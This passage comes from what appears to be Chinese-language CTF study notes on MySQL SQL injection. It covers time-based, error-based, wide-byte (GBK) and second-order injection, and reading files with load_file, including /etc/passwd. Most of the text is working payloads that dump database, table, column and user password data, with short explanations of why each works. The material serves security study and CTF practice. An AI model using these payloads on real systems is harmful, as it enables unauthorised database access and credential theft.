sec)<br></code></pre></td></tr></table></figure><blockquote><p>利用场景是有条件限制的：需要提供长连接。在Apache+PHP搭建的环境中需要使用mysql_pconnect(打开一个到 MySQL 服务器的持久连接)函数来连接数据库。在CTF中，只有出题人很刻意的使用这个函数，才暗示使用这个</p></blockquote></li></ul><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">if(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">&gt;</span><span class="hljs-number">115</span>,<span class="hljs-number">0</span>,sleep(<span class="hljs-number">5</span>))#<br># sleep延时<br><span class="hljs-keyword">select</span> sleep(find_in_set(mid(@<span class="hljs-variable">@version</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;0,1,2,3,4,5,6,7,8,9,.&#x27;</span>));# 在<span class="hljs-number">0</span><span class="hljs-number">-9.</span>中找版本号第一位<br></code></pre></td></tr></table></figure><blockquote><p>sleep函数延时不常用，时间可能因网速影响</p></blockquote><p>利用BENCHMARK()进行延时注入 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;http://127.0.0.1/sqli-labs/Less-5/?id=1&#x27;</span><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> (IF(<span class="hljs-built_in">SUBSTRING</span>(<span class="hljs-keyword">current</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)<span class="hljs-operator">=</span><span class="hljs-type">CHAR</span>(<span class="hljs-number">115</span>),BENCHMARK(<span class="hljs-number">50000000</span>,ENCODE(<span class="hljs-string">&#x27;MSG&#x27;</span>,<span class="hljs-string">&#x27;by 5 seconds&#x27;</span>)),<span class="hljs-keyword">null</span>)),<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">select</span> database() <span class="hljs-keyword">as</span> <span class="hljs-keyword">current</span>) <span class="hljs-keyword">as</span> tb1<span class="hljs-comment">--+</span><br># 当结果正确的时候，运行ENCODE(<span class="hljs-string">&#x27;MSG&#x27;</span>,<span class="hljs-string">&#x27;by 5 seconds&#x27;</span>)操作<span class="hljs-number">50000000</span> 次，会占用一段时间。<br></code></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="报错盲注–floor报错"><a href="#报错盲注–floor报错" class="headerlink" title="报错盲注–floor报错"></a>报错盲注–floor报错</h3><p><u>适用于低版本，mysql8似乎被修复</u></p><p>floor报错注入是利用 <code>select count(*),(floor(rand(0)*2)) x from users group by x</code>这个相对固定的语句格式，导致的数据库报错</p><h4 id="函数说明"><a href="#函数说明" class="headerlink" title="函数说明"></a>函数说明</h4><ul><li>rand() 是一个随机函数(产生0到1间随机浮点数),直接使用每次产生的数都不同，但是当提供了一个固定的随机数的种子0之后：这样每次产生的值都是一样的。</li><li>floor(rand(0)*2） floor()是向下取整，这样可以得到只含0 1的伪随机序列</li></ul><h4 id="报错原因"><a href="#报错原因" class="headerlink" title="报错原因"></a>报错原因</h4><p>当执行以下语句时会报错(主键冲突)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>) x <span class="hljs-keyword">from</span> users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x;<br></code></pre></td></tr></table></figure><blockquote><p>主要利用floor(rand(0)*2)的结果规律为0 1 1 0 1 1，当数据表中最少需要三条数据才会报错</p><p>floor()报错注入的原因是group by在向临时表插入数据时，由于rand()多次计算导致插入临时表时主键重复，从而报错，又因为报错前concat()中的SQL语句或函数被执行，所以该语句报错且被抛出的主键是SQL语句或函数执行后的结果。</p></blockquote><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat(<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x3a</span>,<span class="hljs-number">0x3a</span>,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)) a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a;<br>#也可以简化成<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(version(),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>));<br>#关键表被过滤时<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">!</span><span class="hljs-number">1</span>) <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(version(),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))<br>#rand被过滤 适用用户变量<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">min</span>(<span class="hljs-variable">@a</span>:<span class="hljs-operator">=</span><span class="hljs-number">1</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(password,<span class="hljs-variable">@a</span>:<span class="hljs-operator">=</span>(<span class="hljs-variable">@a</span><span class="hljs-operator">+</span><span class="hljs-number">1</span>)<span class="hljs-operator">%</span><span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs sql">爆库<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> ( <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),(concat((<span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata limit<br><span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x )a;<br>http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>www.hackblog.cn<span class="hljs-operator">/</span>sql.php?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat((<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">distinct</span><br>concat(<span class="hljs-number">0x7e</span>,schema_name,<span class="hljs-number">0x7e</span>) <span class="hljs-keyword">FROM</span> information_schema.schemata LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> information_schema.tables limit<br><span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a)<br>爆表<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),(concat((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span><br>table_schema<span class="hljs-operator">=</span>database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a;<br>爆字段<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),(concat((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span><br>table_schema<span class="hljs-operator">=</span>database() <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span>‘users’ limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),’<span class="hljs-operator">|</span>’,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)))x <span class="hljs-keyword">from</span> information_schema.tables<br><span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a;<br>爆数据<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),(concat((<span class="hljs-keyword">select</span> concat(name,’<span class="hljs-operator">|</span>’,passwd,’<span class="hljs-operator">|</span>’,birth) <span class="hljs-keyword">from</span> users limit<br><span class="hljs-number">0</span>,<span class="hljs-number">1</span>),’<span class="hljs-operator">|</span>’,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a;<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat((<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> (<span class="hljs-keyword">SELECT</span> concat(<span class="hljs-number">0x23</span>,name,<span class="hljs-number">0x3a</span>,passwd,<span class="hljs-number">0x23</span>) <span class="hljs-keyword">FROM</span> users limit<br><span class="hljs-number">0</span>,<span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> information_schema.tables limit <span class="hljs-number">3</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a<br></code></pre></td></tr></table></figure><p>几何函数 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">GeometryCollection：id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> GeometryCollection((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span><span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br>polygon()：id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> polygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br>multipoint()：id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> multipoint((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br>multilinestring()：id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> multilinestring((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br>linestring()：id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> LINESTRING((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br>multipolygon() ：id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> multipolygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br></code></pre></td></tr></table></figure><p>不存在函数</p><blockquote><p>爆数据库</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032231655.jpg" alt="image-20220708181105742"></p></blockquote><p>name_const()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">获取版本信息<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> name_const(version(),<span class="hljs-number">0x1</span>),name_const(version(),<span class="hljs-number">0x1</span>))a;<br># <span class="hljs-number">1060</span> <span class="hljs-operator">-</span> Duplicate <span class="hljs-keyword">column</span> name <span class="hljs-string">&#x27;8.0.27&#x27;</span><br></code></pre></td></tr></table></figure><p>uuid相关函数</p><p>mysql:8.0.x</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">SELECT</span> UUID_TO_BIN((<span class="hljs-keyword">SELECT</span> password <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>));<br># <span class="hljs-number">1146</span> <span class="hljs-operator">-</span> <span class="hljs-keyword">Table</span> <span class="hljs-string">&#x27;test.users&#x27;</span> doesn<span class="hljs-string">&#x27;t exist</span><br><span class="hljs-string">mysql&gt; SELECT BIN_TO_UUID((SELECT password FROM users WHERE id=1));</span><br><span class="hljs-string"># 1146 - Table &#x27;</span>test.users<span class="hljs-string">&#x27; doesn&#x27;</span>t exist<br></code></pre></td></tr></table></figure><p>exp() 适用版本 5.5.5-5.5.49</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span>(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">USER</span>())a));<br><span class="hljs-comment">--其中，~符号为运算符，意思为一元字符反转，通常将字符串经过处理后变成大整数，再放到exp函 数内，得到的结果将超过mysql的double数组范围，从而报错输出。除了exp()之外，还有类似pow()之类的相似函数同样是可利用的，他们的原理相同。</span><br><span class="hljs-comment">--double 数值类型超出范围</span><br><span class="hljs-comment">--Exp()为以e 为底的对数函数；</span><br><br><span class="hljs-comment">--ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(~((select &#x27;root@localhost&#x27; from dual)))&#x27;</span><br><br>如果是在适用版本之外：虽然也会报错，但是表名不会出来<br><span class="hljs-keyword">select</span> <span class="hljs-operator">!</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)<span class="hljs-operator">-</span><span class="hljs-operator">~</span><span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><blockquote><p>exp报错<a href="https://www.cnblogs.com/lcamry/articles/5509124.html">（转载）使用exp进行SQL报错注入 - lcamry - 博客园 (cnblogs.com)</a></p></blockquote><p>pow()结合盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> pow(<span class="hljs-number">1</span><span class="hljs-operator">+</span>(表达式),<span class="hljs-number">999999999999</span>)<br># 表达式可以是盲注的形式，返回<span class="hljs-number">1</span>或者<span class="hljs-number">0</span>，通过报错将字符猜出来，报错回显的表达式是返回<span class="hljs-number">1</span>的<br># 同样方式用在exp上(临界值为<span class="hljs-number">709</span>)<br><span class="hljs-built_in">exp</span>(<span class="hljs-number">709</span><span class="hljs-operator">+</span>(表达式))<br></code></pre></td></tr></table></figure><p>bigint 溢出文章<a href="http://www.cnblogs.com/lcamry/articles/5509112.html">http://www.cnblogs.com/lcamry/articles/5509112.html</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;?id=1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-operator">!</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x) <span class="hljs-operator">-</span> <span class="hljs-operator">~</span><span class="hljs-number">0</span>),<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h3 id="xpath语法错误–较常用"><a href="#xpath语法错误–较常用" class="headerlink" title="xpath语法错误–较常用"></a>xpath语法错误–较常用</h3><p>报错原因，0x7e就是~不属于xpath语法格式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> @<span class="hljs-variable">@version</span>),<span class="hljs-number">0x7e</span>));<br><span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> @<span class="hljs-variable">@version</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>);<br># 适用版本: <span class="hljs-number">5.1</span><span class="hljs-number">.5</span><span class="hljs-operator">+</span><br></code></pre></td></tr></table></figure><blockquote><p>updatexml三个参数</p><ul><li><p>第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc 1</p></li><li><p>第二个参数：XPath_string (Xpath 格式的字符串) ，如果不了解 Xpath 语法，可以在网上查找教程。</p></li><li><p>第三个参数：new_value，String 格式，替换查找到的符合条件的数据**</p></li></ul><p>注意加select防止不回显，当显示字符有限时，常用字符串截断substr配合</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> NAME_CONST(version(),<span class="hljs-number">1</span>),NAME_CONST(version(),<span class="hljs-number">1</span>))x;<br><span class="hljs-comment">--mysql 重复特性，此处重复了version，所以报错。</span><br></code></pre></td></tr></table></figure></blockquote><h3 id="Join-using-注列名"><a href="#Join-using-注列名" class="headerlink" title="Join using()注列名"></a>Join using()注列名</h3><p>mysql8修复</p><p>报错存在重复的列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users)b)c; # 报错信息内回显第一列名称<br>mysql<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users)b <span class="hljs-keyword">using</span>(username))c;# 第二列<br>mysql<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users)b <span class="hljs-keyword">using</span>(username,password))c;# 第三列<br></code></pre></td></tr></table></figure><h3 id="GTID相关函数"><a href="#GTID相关函数" class="headerlink" title="GTID相关函数"></a>GTID相关函数</h3><p>版本&gt;&#x3D;5.6.5</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> gtid_subset(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>); # 报错回显用户<br>mysql<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> gtid_subset(hex(substr((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users limit<br><span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>);<br>mysql<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> gtid_subtract((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a),<span class="hljs-number">1</span>); # 报错回显用户<br></code></pre></td></tr></table></figure><h2 id="导入导出文件"><a href="#导入导出文件" class="headerlink" title="导入导出文件"></a>导入导出文件</h2><h3 id="查看限制"><a href="#查看限制" class="headerlink" title="查看限制"></a>查看限制</h3><p>secure_file_priv</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232760.jpg" alt="image-20220708190755416"></p><h3 id="load-file-导出文件"><a href="#load-file-导出文件" class="headerlink" title="load_file()导出文件"></a>load_file()导出文件</h3><p>load_file(filename)</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232156.jpg" alt="image-20220708190902690"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> load_file(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">convert</span>(load_file(&quot;/etc/passwd&quot;) <span class="hljs-keyword">using</span> utf8);<br></code></pre></td></tr></table></figure><p>详见<a href="https://ccship.cn/2021/10/21/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">SQL注入总结 – cc (ccship.cn)</a></p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="常见思路-1"><a href="#常见思路-1" class="headerlink" title="常见思路"></a>常见思路</h3><p>如果是单引号闭合</p><p>注册一个<code>admin&#39;#</code>账户，登录修改其密码，则实际改的是admin的密码</p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>宽字节就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作，使得攻击者可以通过宽字节编码绕过SQL注入防御。</p><p>宽字节注入主要是源于程序员设置数据库编码与PHP编码设置为不同的两个编码那么就有可能产生宽字节注入。PHP的编码为UTF-8 而MySql的编码设置为了SET NAMES ‘gbk’ 或是SET character_set_client &#x3D;gbk，这样配置会引发编码转换从而导致的注入漏洞。</p><h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><ul><li><p><strong>addslashes()</strong> ：这个函数在预定义字符之前添加反斜杠 \ 。预定义字符： 单引号 ‘ 、双引号 ” 、反斜杠 \ 、NULL。但是这个函数有一个特点就是虽然会添加反斜杠 \ 进行转义，但是 \ 并不会插入到数据库中。</p><blockquote><p>这个函数功能与魔术引号功能完全相同，如果魔术引号打开就不要用这个函数了</p></blockquote></li><li><p>三个魔术引号功能</p><blockquote><ol><li><p>magic_quotes_gpc 影响到 HTTP 请求数据（GET，POST 和 COOKIE）。不能在运行时改变。在 PHP 中默认值为 on。 参见 get_magic_quotes_gpc()。如果 magic_quotes_gpc 关闭时返回 0，开启时返回 1。在 PHP 5.4.0 起将始终返回 0，因为这个魔术引号功能已经从 PHP 中移除了。</p></li><li><p>magic_quotes_runtime 如果打开的话，大部份从外部来源取得数据并返回的函数，包括从数据库和文本文件，所返回的数据都会被反斜线转义。该选项可在运行的时改变，在 PHP 中的默认值为 off。 参见 set_magic_quotes_runtime() 和 get_magic_quotes_runtime()。</p></li><li><p>magic_quotes_sybase (魔术引号开关)如果打开的话，将会使用单引号对单引号进行转义而非反斜线。此选项会完全覆盖 magic_quotes_gpc。如果同时打开两个选项的话，单引号将会被转义成 ”。而双引号、反斜线 和 NULL 字符将不会进行转义。</p></li></ol></blockquote></li></ul><h3 id="gbk编码"><a href="#gbk编码" class="headerlink" title="gbk编码"></a>gbk编码</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">用户名输入：admin<span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; or 1=1#</span><br><span class="hljs-string">转义后为： admin%df\&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>#<br><span class="hljs-keyword">SET</span> character_set_client <span class="hljs-operator">=</span><span class="hljs-string">&#x27;gbk&#x27;</span>后：admin運<span class="hljs-string">&#x27; or 1=1#</span><br><span class="hljs-string">执行语句：... where username=&#x27;</span>admin運<span class="hljs-string">&#x27; or 1=1#&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p><code>%df</code>吃掉<code>\</code>的原因是，<code>urlencode(\&#39;)</code>&#x3D;<code>%5c%27</code> ,添加%df后形成<code>%df%5c%27</code>,而上面提到的mysql 在GBK 编码方式的，第一位范围为0x00-0x7F时，当作一个字符。%df不在这个范围内，因此会将两个字节当做一个汉字，此时%df%5c 就是一个汉字，%27(‘) 则作为一个单独的符号在外面，同时也就达到了我们的目的</p></blockquote><h3 id="utf8编码、Latin1编码"><a href="#utf8编码、Latin1编码" class="headerlink" title="utf8编码、Latin1编码"></a>utf8编码、Latin1编码</h3><p>UTF-8编码是变长编码，可能有1~4个字节表示： </p><ul><li>一字节时范围是<code>[00-7F] </code></li><li>两字节时范围是<code>[C0-DF][80-BF]</code> </li><li>三字节时范围是<code>[E0-EF][80-BF][80-BF]</code> 